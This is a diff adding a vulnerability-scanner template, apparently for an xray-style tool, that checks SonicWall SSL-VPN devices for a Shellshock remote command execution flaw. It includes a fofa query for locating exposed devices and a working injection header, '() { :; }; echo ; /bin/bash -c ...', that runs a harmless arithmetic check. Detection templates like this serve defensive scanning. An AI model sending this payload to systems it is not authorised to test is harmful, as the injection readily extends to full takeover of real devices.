@@ -1,0 +1,25 @@
+id: sonicwall-ssl-vpn-rce
+
+info:
+  name: SonicWall SSL-VPN 远程命令执行漏洞
+  author: sharecast
+  severity: high
+  verified: false
+  description: |
+    SonicWall SSL-VPN 远程命令执行在1月24日被公开 EXP，此设备存在远程命令执行漏洞
+    fofa: app="SONICWALL-SSL-VPN"
+  tags: sonicwall,vpn,rce
+  created: 2023/12/01
+
+set:
+  r1: randomInt(40000, 44800)
+  r2: randomInt(1140000, 1144800)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/jarrewrite.sh
+      headers:
+        X-Test: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
+expression: r0()
